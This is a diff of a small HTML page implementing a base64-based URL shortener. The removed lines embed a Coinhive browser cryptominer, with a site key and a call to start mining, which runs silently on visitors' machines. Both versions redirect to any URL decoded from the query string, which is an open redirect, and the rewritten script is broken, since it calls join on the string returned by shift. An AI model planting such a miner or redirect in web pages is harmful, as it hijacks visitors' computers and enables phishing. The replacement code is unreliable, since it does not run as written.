@@ -1,23 +1,6 @@
 <script>
-  function func() {
-    txt=window.location.protocol + "//" + window.location.hostname + window.location.pathname + "?url=" + btoa(document.getElementById("uts").value)
-    document.write("<a href='" + txt + "'>" + txt + "</a>");
-  }
-  var url = window.location.href;
-  url=url.split("?url=");
-  url.shift();
-  url.join("?url=");
-  if(url!="") {
-    var url = atob(url);
-    window.location.href = url;
-  } else {
-    document.write("Enter URL to shorten: <input type=text id=uts><button onclick=\"func();\">Shorten</button>");
-  }
-</script>
-
-<!-- Coin-hive Miner reference -->
-<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
-<script type="text/javascript">
-var miner = new CoinHive.Anonymous('pUhvRAMNDIW3dIVsUuRI9FfG7OOTgBLw');
-miner.start();
+	const f = () => document.write((t => "<a href='" + t + "'>" + t + "</a>")(window.location.protocol + "//" + window.location.hostname + window.location.pathname + "?url=" + btoa(document.getElementById("uts").value)));
+	const url = window.location.href.split("?url=").shift().join("?url=");
+	if (url != "") window.location.href = atob(url);
+	else document.write("Enter URL to shorten: <input type=text id=uts><button onclick=\"f();\">Shorten</button>");
 </script>
